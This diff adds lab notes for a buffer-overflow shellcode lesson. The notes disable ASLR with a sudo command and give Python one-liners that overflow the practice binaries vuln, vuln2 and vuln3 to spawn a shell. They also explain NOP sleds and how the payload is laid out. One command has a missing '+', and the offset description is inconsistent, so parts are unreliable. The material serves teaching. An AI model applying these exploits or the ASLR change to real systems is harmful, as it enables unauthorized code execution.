@@ -1,0 +1,33 @@
+1) Go to intranet.cs.usna.edu/~m152196/iwg/shellcode_lesson
+2) Download all files
+3) Disable ASLR with:
+    $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+    (re-enable later by replacing the 0 with 1)
+
+./vuln
+------
+Doing
+    $ ./vuln $(python -c "print 'A'*44+'\xef\xbe\xad\xde'")
+    $ dmesg | tail -n 1
+shows that ./vuln's IP is overwritten with a 44 byte offset (IP is at bytes 45
+and 46). We want to insert some shellcode and set the IP so that we jump to the shellcode.
+Luckily, Aaron already supplied us some shellcode in the small-shell file. We just need to
+insert it into that 44-byte buffer.
+vuln2 is particularly nice because it prints out where the buffer is stored in memory. So:
+    $ ./vuln2 $(python -c "sh=open('small-shell').read().strip(); print sh + (44 - len(sh)) * 'A' + '\xaa\xaa\xaa\xaa'")
+gives me: "buf @ 0xffffd060" (as well as some silly A's and weird characters). Thus, I can
+jump to the start of the buffer with:
+    $ ./vuln2 $(python -c "sh=open('small-shell').read().strip(); print sh + (44 - len(sh)) * 'A' '\x60\xd0\xff\xff'")
+NOTE: everybody will have different addresses that they need to jump to. So, when
+substituting in the buffer address, just remember to do it in little-endian format.
+
+vuln3 has this weird thing where you'll segfault at both 260 A's + an address and at 268 A's + an address. You want the 268 (you would figure this out with trial-and-error IRL.)
+Nevertheless, I was able to get shell with:
+    $ ./vuln3.kFegTa $(python -c "sh=open('small-shell').read().strip(); print sh + 'A' * (268-len(sh)) + '\x90\xce\xff\xff'")
+
+In real life, you won't have ASLR turned off, which makes this sort of thing much harder.
+Also, it may require some gdb and some math to figure out what you need to set the IP to.
+Also, you generally add in nop sleds as well. The nops provide a region that you can jump to
+which will bring you right into the shellcode. A nop is 0x90. The bigger your sled, the 
+easier it is to get to a memory address on the sled. In all, your package will look like:
+    SHELLCODE + NOPS + JUNK + MEMADDRESS
